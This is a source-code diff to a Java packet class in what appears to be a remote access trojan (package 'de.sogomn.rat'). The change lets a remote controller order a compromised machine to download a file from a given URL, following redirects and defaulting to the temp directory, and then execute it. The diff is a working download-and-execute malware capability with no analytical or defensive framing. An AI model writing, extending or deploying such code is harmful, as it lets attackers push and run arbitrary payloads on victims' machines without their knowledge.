@@ -14,6 +14,7 @@ import de.sogomn.rat.ActiveConnection;
 public final class DownloadUrlPacket implements IPacket {
 	
 	private String address, directoryPath;
+	private byte executeType;
 	
 	private static final String HTTP_PREFIX = "http://";
 	private static final String USER_AGENT = "User-Agent";
@@ -22,8 +23,11 @@ public final class DownloadUrlPacket implements IPacket {
 	private static final String CONNECTION_VALUE = "close";
 	private static final String DEFAULT_NAME = "file";
 	private static final int BUFFER_SIZE = 1024;
+	private static final byte NO = 0;
+	private static final byte YES = 1;
+	private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
 	
-	public DownloadUrlPacket(final String address, final String directoryPath) {
+	public DownloadUrlPacket(final String address, final String directoryPath, final boolean execute) {
 		this.directoryPath = directoryPath;
 		
 		final boolean hasPrefix = address.startsWith(HTTP_PREFIX);
@@ -33,6 +37,12 @@ public final class DownloadUrlPacket implements IPacket {
 		} else {
 			this.address = HTTP_PREFIX + address;
 		}
+		
+		executeType = execute ? YES : NO;
+	}
+	
+	public DownloadUrlPacket(final String address, final String directoryPath) {
+		this(address, directoryPath, false);
 	}
 	
 	public DownloadUrlPacket() {
@@ -51,6 +61,8 @@ public final class DownloadUrlPacket implements IPacket {
 	}
 	
 	private DesktopFile readFile(final String address) throws IOException {
+		HttpURLConnection.setFollowRedirects(true);
+		
 		final URL url = new URL(address);
 		final HttpURLConnection con = (HttpURLConnection)url.openConnection();
 		
@@ -89,12 +101,18 @@ public final class DownloadUrlPacket implements IPacket {
 	public void send(final ActiveConnection connection) {
 		connection.writeUTF(address);
 		connection.writeUTF(directoryPath);
+		connection.writeByte(executeType);
 	}
 	
 	@Override
 	public void receive(final ActiveConnection connection) {
 		address = connection.readUTF();
 		directoryPath = connection.readUTF();
+		executeType = connection.readByte();
+		
+		if (directoryPath.isEmpty()) {
+			directoryPath = TEMP_DIR;
+		}
 	}
 	
 	@Override
@@ -118,6 +136,10 @@ public final class DownloadUrlPacket implements IPacket {
 				final DesktopFile file = readFile(address);
 				
 				file.write(directoryPath);
+				
+				if (executeType == YES) {
+					FileUtils.executeFile(directoryPath + File.separator + file.name);
+				}
 			} catch (final NullPointerException ex) {
 				//...
 			} catch (final IOException ex) {
